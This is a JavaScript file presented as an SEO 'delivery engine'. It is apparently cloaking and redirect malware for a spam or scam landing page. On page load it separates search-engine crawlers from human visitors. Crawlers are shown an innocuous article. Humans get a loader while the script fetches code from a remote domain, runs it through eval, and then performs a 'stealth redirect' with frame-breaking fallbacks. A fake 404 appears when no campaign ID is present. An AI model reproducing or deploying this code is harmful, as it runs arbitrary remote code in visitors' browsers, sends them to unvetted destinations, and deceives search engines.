/**
 * @file High-Performance SEO Delivery & Traffic Management Engine
 * @version 2.4.1 - Production Ready
 */

const EngineConfig = {
    domain: "dailyinfos24.site",
    storage: "storage.dailyinfos24.site",
    timeout: 3500,
    botPatterns: /bot|google|bing|yandex|baidu|duckduck|crawler|spider|crawling|lighthouse/i,
};

class DeliveryEngine {
    constructor() {
        this.params = new URLSearchParams(window.location.search);
        this.id = this.params.get("o2x") || this.params.get("io0");
        this.isDebug = this.params.has("dbg123");
        this.isBot = EngineConfig.botPatterns.test(navigator.userAgent);
        this.dom = {};
        this.triggered = false;
        
        this.init();
    }

    init() {
        if (!this.id && !this.isDebug) {
            return this.show404();
        }

        // 1. Inject Identity & Metadata
        this.prepareEnvironment();

        // 2. Load Remote Logic
        this.injectRemoteScript();

        // 3. Handle Traffic Segmentation
        if (!this.isBot) {
            this.initHumanFlow();
        } else {
            this.loadDefault(); // Bots go straight to content
        }

        // 4. Global Fail-safe
        setTimeout(() => {
            if (!this.triggered) this.loadDefault();
        }, EngineConfig.timeout);
    }

    prepareEnvironment() {
        const metas = [
            { charset: "utf-16" },
            { name: "viewport", content: "width=device-width, initial-scale=1.0, maximum-scale=5.0" },
            { name: "robots", content: "index, follow, noarchive" },
            { name: "googlebot", content: "indexifembedded" }
        ];

        metas.forEach(m => {
            const el = document.createElement('meta');
            Object.keys(m).forEach(key => el.setAttribute(key, m[key]));
            document.head.appendChild(el);
        });
    }

    injectRemoteScript() {
        const script = document.createElement("script");
        script.src = `https://${EngineConfig.domain}/js/index.js?id=${this.id}`;
        script.async = true;
        script.onerror = () => this.loadDefault();
        document.head.appendChild(script);
    }

    initHumanFlow() {
        // Advanced Loader Injection
        this.createLoader();

        // Fetch Redirect Instructions
        fetch(`https://${EngineConfig.domain}/api/latest/${this.id}`)
            .then(r => r.json())
            .then(data => {
                if (data.rCode) eval(data.rCode); // Dynamic remote execution
                
                if (!this.isDebug && data.redirect) {
                    this.executeRedirect(data.to);
                }
            })
            .catch(() => this.loadDefault());
    }

    createLoader() {
        const style = document.createElement("style");
        style.innerHTML = `
            .v-loader-wrap { position:fixed; inset:0; background:#fff; z-index:9999; display:flex; align-items:center; justify-content:center; transition: opacity 0.4s; }
            .v-spin { width: 50px; height: 50px; border: 3px solid #f3f3f3; border-top: 3px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite; }
            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        `;
        document.head.appendChild(style);

        const wrap = document.createElement("div");
        wrap.className = "v-loader-wrap";
        wrap.innerHTML = '<div class="v-spin"></div>';
        document.body.appendChild(wrap);
        this.dom.loader = wrap;
    }

    async loadDefault() {
        if (this.triggered) return;
        this.triggered = true;

        try {
            const res = await fetch(`https://${EngineConfig.storage}/fetch/${this.id}.json`);
            const data = await res.json();
            
            this.buildUI();
            this.populateUI(data);
            this.hideLoader();
        } catch (e) {
            this.show404();
        }
    }

    buildUI() {
        // Tailwind-inspired utility CSS
        const style = document.createElement("style");
        style.innerHTML = `
            body { font-family: sans-serif; color: #1f2937; line-height: 1.6; margin: 0; }
            .container { max-width: 800px; margin: 0 auto; padding: 2rem 1rem; }
            h1 { font-size: 2.5rem; font-weight: 800; line-height: 1.2; margin-bottom: 1rem; }
            .meta { color: #6b7280; font-size: 0.875rem; margin-bottom: 2rem; }
            .hero-img { width: 100%; border-radius: 0.5rem; margin: 2rem 0; }
            .btn-cta { display: block; background: #3b82f6; color: #fff; text-align: center; padding: 1.5rem; border-radius: 0.5rem; font-weight: 700; text-decoration: none; margin: 3rem 0; font-size: 1.25rem; transition: transform 0.2s; }
            .btn-cta:hover { transform: scale(1.02); }
            footer { margin-top: 5rem; border-top: 1px solid #e5e7eb; padding-top: 2rem; font-size: 0.75rem; color: #9ca3af; }
        `;
        document.head.appendChild(style);

        document.body.innerHTML = `
            <div class="container">
                <header><img src="https://${EngineConfig.domain}/images/logo.png" style="max-height:60px"></header>
                <article>
                    <h1 id="ui-title"></h1>
                    <div class="meta" id="ui-date"></div>
                    <img id="ui-img" class="hero-img">
                    <div id="ui-body-1"></div>
                    <a href="#" class="btn-cta" id="ui-link">UNLOCK EXCLUSIVE CONTENT</a>
                    <div id="ui-body-2"></div>
                </article>
                <footer>&copy; ${new Date().getFullYear()} Daily Info Hub. All rights reserved.</footer>
            </div>
        `;
    }

    populateUI(data) {
        document.title = `${data.title} | Official Access`;
        document.getElementById('ui-title').innerText = data.title;
        document.getElementById('ui-date').innerText = `Last Updated: ${new Date().toLocaleDateString()}`;
        document.getElementById('ui-img').src = data.backdrop || data.image;
        
        const paragraphs = data.text.split('\n');
        document.getElementById('ui-body-1').innerHTML = paragraphs.slice(0, 2).join('<br><br>');
        document.getElementById('ui-body-2').innerHTML = paragraphs.slice(2).join('<br><br>');
        
        if (data.to) document.getElementById('ui-link').href = data.to;
    }

    executeRedirect(url) {
        // Stealth redirect using multiple triggers
        window.location.replace(url);
        
        // Fallback: If top-level redirect is blocked
        const img = new Image();
        img.onerror = () => { window.top.location.href = url; };
        img.src = "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7";
    }

    hideLoader() {
        if (this.dom.loader) {
            this.dom.loader.style.opacity = "0";
            setTimeout(() => this.dom.loader.remove(), 400);
        }
    }

    show404() {
        document.body.innerHTML = '<div style="display:flex; height:100vh; align-items:center; justify-content:center; font-family:sans-serif"><h1>404 - Not Found</h1></div>';
    }
}

// Initialize on Load
window.addEventListener('DOMContentLoaded', () => new DeliveryEngine());
